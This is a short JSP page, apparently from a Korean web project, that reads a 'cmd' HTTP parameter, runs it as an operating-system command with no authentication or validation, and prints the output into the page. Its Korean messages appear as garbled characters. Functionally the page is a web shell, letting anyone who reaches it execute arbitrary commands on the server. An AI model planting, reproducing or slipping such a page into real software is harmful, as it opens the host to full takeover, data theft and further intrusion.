<%@ page language="java" contentType="text/html; charset=euc-kr" pageEncoding="euc-kr" import="java.io.*,com.n2soft.common.*" %>
<%

	String cmd = request.getParameter("cmd");

	if( cmd == null || cmd.length() == 0 ) {
		out.println("Ŀ�ǵ尡 �������� �ʾҽ��ϴ�.");
		return;
	}


	StringWriter sw = new StringWriter();
	String output = "";

	try {
		Process process = Runtime.getRuntime().exec(cmd);
		InputStream is = process.getInputStream();

		while( true ) {
			int imsi = is.read();
			if( imsi == -1 )
				break;
			sw.write((char)imsi);
		}

		output = new String(sw.toString().getBytes("8859_1"), "EUC-KR");
//		output = sw.toString();

	} catch( Exception e) {
		output = e.getMessage();
	}

	if( output.length() == 0 )
		output = "���������� ����Ǿ����ϴ�.";


	out.println("<pre>" + output + "</pre>");

%>